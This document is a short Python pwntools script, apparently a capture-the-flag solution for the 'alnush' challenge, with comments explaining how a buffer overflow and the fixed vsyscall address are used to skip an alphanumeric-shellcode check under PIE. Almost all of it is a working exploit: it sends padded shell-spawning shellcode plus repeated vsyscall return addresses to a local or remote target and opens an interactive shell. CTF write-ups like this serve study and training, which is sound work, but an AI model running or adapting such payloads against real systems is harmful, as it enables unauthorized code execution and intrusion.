#!/usr/bin/env python
from pwn import *

# You don't need to write alphanumeric shellcode.
# There is BOF on the function inputting shellcode. But as PIE is enabled, you can't ROP.
# To skip the check code, the address 0xffffffffff600000 which is fixed even in PIE can be used.

# gdb-peda$ x/3i 0xffffffffff600000
#   0xffffffffff600000:  mov    rax,0x60
#   0xffffffffff600007:  syscall
#   0xffffffffff600009:  ret

# It just do ret. By using this address, you can skip the function checking if the input is
# a alphanumeric shellcode while keeping the stack frame on the exact postion.

# Here is my exploit code.

if __name__ == '__main__':
    context(os = 'linux', arch = 'amd64')
    if len(sys.argv) == 1:
        s = process('./alnush')
    else:
        s = remote('problem.harekaze.com',20003)

    payload = ''
    payload += asm(shellcraft.sh()).ljust(0x208,'A')
    payload += p64(0xffffffffff600000) * 10
    s.sendafter('Enter shellcode >> ',payload)
    s.interactive()
